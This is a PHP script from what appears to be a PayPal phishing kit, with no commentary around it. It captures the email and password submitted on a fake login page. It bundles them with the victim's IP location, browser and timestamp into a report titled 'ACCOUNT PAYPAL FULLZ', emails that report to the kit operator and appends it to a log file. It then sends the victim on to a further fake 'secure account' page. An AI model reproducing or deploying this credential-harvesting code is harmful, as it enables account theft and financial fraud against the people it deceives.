<?php
	session_start();
	error_reporting(E_ERROR | E_PARSE);
	date_default_timezone_set('GMT'); 
	$TIME_DATE = date('H:i:s d/m/Y');
	include('../Safe/xanbbx.php');
	include('../../functions/Config.php');
	include('../Safe/get_lg.php');
	include('../../functions/get_browser.php');

	$_SESSION['xysemailx'] = $_POST['xysemailx'];
	$_SESSION['xyspassx'] = $_POST['xyspassx'];

	$xysmsgx = "<!DOCTYPE html>
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>ACCOUNT PAYPAL FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['xysemailx']."</font><br>
<font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['xyspassx']."</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [State]	= <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY xXXx.BLBD XV4</font> #####################
</div></html>\n";
	$xsubx = "LOGIN | [".$_SESSION['xcountryx']."] | [".$_SESSION['xipx']."] ";
	$xheadx = "MIME-Version: 1.0" . "\r\n";
	$xheadx .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$xheadx .= "From:XVerGinia.V4 ♥<noreply@logins.com>" . "\r\n";
	mail($Z118_EMAIL, $xsubx, $xysmsgx, $xheadx);

 $zbi = fopen("../../../../ADMIN-XV3/ID.html", "a");
	fwrite($zbi, $xysmsgx);

HEADER("Location: ../Safe/secureaccount.php?enc=".md5(microtime())."&p=0&dispatch=".sha1(microtime())."");
?>